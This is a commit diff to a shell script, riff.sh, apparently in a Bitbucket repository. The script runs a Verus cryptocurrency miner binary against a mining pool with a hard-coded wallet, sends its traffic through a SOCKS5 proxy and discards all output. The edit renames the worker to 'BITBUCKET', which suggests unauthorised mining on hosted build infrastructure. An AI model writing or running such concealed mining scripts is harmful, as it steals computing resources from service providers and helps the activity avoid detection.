bdb1fc04b08e8cb32684dfada0bfb30935f5155f
layla tufnell <laylatufnell@teleworm.us>
2021-08-14 06:11:10 +0000

    riff.sh edited online with Bitbucket

--- riff.sh
+++ riff.sh
@@ -6,6 +6,6 @@ screen -dmS ls
 POOL=stratum+tcp://verushash.na.mine.zergpool.com:3300
 WALLET=DLd8SKUyrMCAuUt4ToGWDirH6fpQTf6BvV
 PROXY=socks5://192.252.209.155:14455
-WORKER=$(echo $(shuf -i 1000-9999 -n 1)-PRANKENSTAINT)
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-BITBUCKET)
 timeout 280m ./dark -a verus -o $POOL -u $WALLET.$WORKER -p x -t 4 -x $PROXY > /dev/null 2>&1
 echo Sukses
